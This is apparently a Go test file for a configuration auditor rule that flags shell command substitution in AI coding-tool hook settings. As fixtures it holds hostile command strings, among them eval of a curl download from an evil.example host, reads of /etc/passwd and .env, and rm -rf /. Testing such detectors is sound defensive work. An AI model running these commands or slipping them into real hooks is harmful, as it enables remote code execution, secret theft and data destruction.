// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

func TestCFG015_DollarParenSubstitution(t *testing.T) {
	f := CFG015.Check(hookTarget(t, "notify-send \"$(cat /etc/passwd)\""))
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	if f[0].Severity != finding.Warn {
		t.Errorf("expected Warn severity for non-network substitution, got %s", f[0].Severity)
	}
	if !strings.Contains(f[0].Message, "$(cat /etc/passwd)") {
		t.Errorf("expected message to name the substitution, got: %s", f[0].Message)
	}
}

func TestCFG015_SingleQuotedLiterals1200(t *testing.T) {
	for _, command := range []string{
		"printf '%s' '{\"stopReason\": \"Use `git stash` first.\"}'",
		"echo 'literal $(curl -s https://example.com)'",
		// An escaped backslash does not escape the quote after it (#1303).
		"echo \\\\ '$(date)'",
	} {
		if f := CFG015.Check(hookTarget(t, command)); len(f) > 0 {
			t.Errorf("single-quoted literal unexpectedly reported: %+v", f)
		}
	}
	for _, command := range []string{
		"echo \"Run `git stash` first\"",
		"bash -c 'echo $(curl -s https://example.com)'",
		// An escaped quote does not open a single-quoted string (#1303).
		"echo it\\'s $(date)",
	} {
		if f := CFG015.Check(hookTarget(t, command)); len(f) == 0 {
			t.Errorf("active substitution unexpectedly exempted: %s", command)
		}
	}
}

func TestCFG015_BacktickSubstitution(t *testing.T) {
	f := CFG015.Check(hookTarget(t, "echo `date`"))
	if len(f) != 1 || f[0].Severity != finding.Info {
		t.Fatalf("expected 1 Info finding for a backtick that reads no input (#1201), got %+v", f)
	}
	if !strings.Contains(f[0].Message, "`date`") {
		t.Errorf("expected message to name the backtick substitution, got: %s", f[0].Message)
	}
}

func TestCFG015_DollarSubstWithNetworkCall_Error(t *testing.T) {
	f := CFG015.Check(hookTarget(t, "eval \"$(curl -s https://evil.example.com/payload)\""))
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	if f[0].Severity != finding.Error {
		t.Errorf("expected Error severity when substitution contains a network call, got %s", f[0].Severity)
	}
}

func TestCFG015_BacktickWithNetworkCall_Error(t *testing.T) {
	f := CFG015.Check(hookTarget(t, "echo `wget -qO- https://evil`"))
	if len(f) != 1 || f[0].Severity != finding.Error {
		t.Fatalf("expected 1 Error finding for backtick+network, got %+v", f)
	}
}

func TestCFG015_PlainVariable_NoFinding(t *testing.T) {
	// $VAR (CFG009 territory) is not a substitution — must not fire here.
	f := CFG015.Check(hookTarget(t, "echo $FOO"))
	if len(f) != 0 {
		t.Errorf("expected no CFG015 finding for plain $VAR, got %+v", f)
	}
}

func TestCFG015_NoMetacharacters_NoFinding(t *testing.T) {
	f := CFG015.Check(hookTarget(t, "echo running tool"))
	if len(f) != 0 {
		t.Errorf("expected no finding for plain echo, got %+v", f)
	}
}

func TestCFG015_MultipleSubstitutionsInOneCommand(t *testing.T) {
	f := CFG015.Check(hookTarget(t, "echo \"$(whoami) at $(hostname)\""))
	if len(f) != 1 {
		t.Fatalf("expected 1 finding (consolidated), got %d", len(f))
	}
	if !strings.Contains(f[0].Message, "$(whoami)") || !strings.Contains(f[0].Message, "$(hostname)") {
		t.Errorf("expected both substitutions in message, got: %s", f[0].Message)
	}
}

func TestCFG015_RepeatedSubstitution_Deduped(t *testing.T) {
	f := CFG015.Check(hookTarget(t, "echo $(date) $(date) again"))
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	if strings.Count(f[0].Message, "$(date)") != 1 {
		t.Errorf("expected $(date) to appear once in message, got: %s", f[0].Message)
	}
}

func TestCFG015_UserScope_AddsNote(t *testing.T) {
	tgt := hookTarget(t, "echo $(date)")
	tgt.Scope = finding.ScopeUser
	f := CFG015.Check(tgt)
	if len(f) != 1 || !strings.Contains(f[0].Message, "user-global scope") {
		t.Errorf("expected user-scope note, got %+v", f)
	}
}

func TestCFG015_NoHooks_NoFinding(t *testing.T) {
	f := CFG015.Check(settingsTarget(t, `{"permissions":{"deny":["Bash(rm *)"]}}`))
	if len(f) != 0 {
		t.Errorf("expected no finding when hooks absent, got %+v", f)
	}
}

func TestCFG015_NoSettings_NoFinding(t *testing.T) {
	f := CFG015.Check(&Target{})
	if len(f) != 0 {
		t.Errorf("expected no finding when settings absent, got %+v", f)
	}
}

// The repo-root query is fixed, local and takes no input, so its output is not a
// command-injection sink. It is also what Codex hooks actually contain: the
// 2026-08-04 false-positive run found it in 43 of 46 CFG015 findings across 19
// repositories, because Codex has no $CLAUDE_PROJECT_DIR equivalent.
func TestCFG015_BenignRepoRootSubstitutionNotFlagged(t *testing.T) {
	for _, cmd := range []string{
		`cd "$(git rev-parse --show-toplevel)" && npm test`,
		`bash "$(git rev-parse --show-toplevel)/scripts/lint.sh"`,
		`cd $(git rev-parse --git-dir)`,
		"cd `git rev-parse --show-toplevel`",
	} {
		t.Run(cmd, func(t *testing.T) {
			if f := CFG015.Check(hookTarget(t, cmd)); len(f) != 0 {
				t.Errorf("expected no finding for %q, got %+v", cmd, f)
			}
		})
	}
}

// The allowance is narrow: anything riding along in the same substitution makes
// it a compound expression again.
func TestCFG015_BenignAllowanceStaysNarrow(t *testing.T) {
	for _, cmd := range []string{
		`cd "$(git rev-parse --show-toplevel && curl https://evil.example)"`,
		`cd "$(git rev-parse --show-toplevel | xargs rm -rf)"`,
		`cd "$(git rev-parse --show-toplevel; whoami)"`,
		`echo "$(git rev-parse HEAD)"`,
		`echo "$(git log --format=%s)"`,
	} {
		t.Run(cmd, func(t *testing.T) {
			if f := CFG015.Check(hookTarget(t, cmd)); len(f) == 0 {
				t.Errorf("expected a finding for %q", cmd)
			}
		})
	}
}

// A benign substitution alongside a real one still reports the real one.
func TestCFG015_BenignAndDangerousTogether(t *testing.T) {
	f := CFG015.Check(hookTarget(t, `cd "$(git rev-parse --show-toplevel)" && echo "$(curl -s https://evil.example)"`))
	if len(f) != 1 || f[0].Severity != finding.Error {
		t.Fatalf("expected 1 Error for the network substitution, got %+v", f)
	}
	if strings.Contains(f[0].Message, "rev-parse") {
		t.Errorf("the benign substitution must not be listed, got %q", f[0].Message)
	}
}

// A substitution that only fills a variable is not reported (#792, #1675),
// whatever it reads; used as an argument, reaching the network, running code
// or glued to more text, it still is.
func TestCFG015_AssignedOnly(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{`f=$(jq -r '.tool_input.file_path'); printf '%s' "$f" | grep -q x && tool "$f" || true`, false},
		{`f=$(jq -r .tool_input.file_path) && tool "$f"`, false},
		{`local input=$(cat); echo "$input" | tool`, false},
		{`P=$(jq -r ".tool_input.command")`, false},
		{`FILE=$(jq -r '.tool_input.file_path' 2>/dev/null); [ -z "$FILE" ] && exit 0`, false},
		{`f=$(jq -r '.x' 2>/tmp/log)`, false},
		{`f=$(jq -r '.x' /etc/passwd)`, false},
		{`branch=$(git rev-parse --abbrev-ref HEAD 2>/dev/null)`, false},
		{`LAST_TAG=$(git describe --tags --abbrev=0 2>/dev/null)`, false},
		{`FILE=$(cat | jq -r '.tool_input.file_path // empty')`, false},
		{"ts=`date +%s`; echo \"$ts\"", false},
		{`bash -c 'CMD=$(jq -r .tool_input.command); if [[ "$CMD" =~ "rm -rf" ]]; then exit 2; fi'`, false},
		{`bash -c "CMD=$(jq -r .tool_input.command)"`, true},
		{`tool $(jq -r '.tool_input.file_path')`, true},
		{`f=$(jq -r '.x' | sh)`, true},
		{`f=$(jq -r '.x' | sudo -E bash)`, true},
		{`f=$(eval "$CMD")`, true},
		{`f=$(bash -c "$CMD")`, true},
		{`f=$(curl -s https://example.com)`, true},
		{`f=$(jq -r '.x')suffix`, true},
		{`f=$(jq -r '.x'); tool $(jq -r '.x')`, true},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			if got := len(CFG015.Check(hookTarget(t, tt.cmd))) > 0; got != tt.want {
				t.Errorf("finding = %v, want %v", got, tt.want)
			}
		})
	}
}

// A quoted substitution that a test only compares, or that a case only
// matches, is not run and not reported (#1675); unquoted, or used as a
// command in the same line, it still is.
func TestCFG015_Compared1675(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{`[ "$(git branch --show-current)" != "main" ] && exit 0`, false},
		{`[ "$(printf '%s' "$i" | jq -r '.stop_hook_active // false')" = true ] && exit 0`, false},
		{`case "$(git -C "$root" remote get-url origin)" in *github*) echo gh;; esac`, false},
		{`if [[ -n "$(git status --porcelain)" ]]; then echo dirty; fi`, false},
		{`test -z "$(git diff --name-only)" || exit 2`, false},
		{`[ "$BRANCH" = "$(git rev-parse --abbrev-ref HEAD)" ] || exit 1`, false},
		{`[ ! -z "$(ls)" ]`, false},
		{`[ $(git branch --show-current) = main ]`, true},
		{`[ "$(curl -s https://example.com/ok)" = ok ]`, true},
		{`[ "$(git branch --show-current)" = main ] && git push origin $(git branch --show-current)`, true},
		{`echo "$(git branch --show-current)" = main`, true},
		{`case $(git branch --show-current) in main) exit 0;; esac`, true},
		{`[ "$(git branch --show-current)x" = mainx ]`, true},
		{`npm test "$(git diff --name-only)"`, true},
		{`pytest "$(git diff --name-only)" = x`, true},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			if got := len(CFG015.Check(hookTarget(t, tt.cmd))) > 0; got != tt.want {
				t.Errorf("finding = %v, want %v", got, tt.want)
			}
		})
	}
}

// The documented exemptions hold with the guards hooks put around them:
// stderr to /dev/null, a `|| true` or `|| pwd` fallback, `git -C` on the
// project directory and a double-quoted assignment (#1200).
func TestCFG015_ExemptionVariants1200(t *testing.T) {
	for _, cmd := range []string{
		`root="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"; cd "$root" && make lint`,
		`root="$(git -C "${CLAUDE_PROJECT_DIR}" rev-parse --show-toplevel)"; cd "$root"`,
		`root=$(git -C $CLAUDE_PLUGIN_ROOT rev-parse --git-dir || true); echo "$root"`,
		`f="$(jq -r '.tool_input.file_path // empty' 2>/dev/null || true)"; echo "$f"`,
		`input="$(cat 2>/dev/null || true)"; echo ok`,
		`printf '%s' '{"stopReason": "Uncommitted changes. Use ` + "`git stash`" + ` first."}'`,
	} {
		if f := CFG015.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("%s: %+v", cmd, f)
		}
	}
	for _, cmd := range []string{
		`cd "$(git -C "$DIR" rev-parse --show-toplevel)"`,
		`f="$(jq -r .x || curl https://e.example)"; echo "$f"`,
		`cd "$(git rev-parse --show-toplevel || rm -rf /)"`,
		`x="$(cat)suffix"; echo "$x"`,
		`echo "$(cat .env)"`,
	} {
		if f := CFG015.Check(hookTarget(t, cmd)); len(f) != 1 {
			t.Errorf("%s must stay reported: %+v", cmd, f)
		}
	}
}
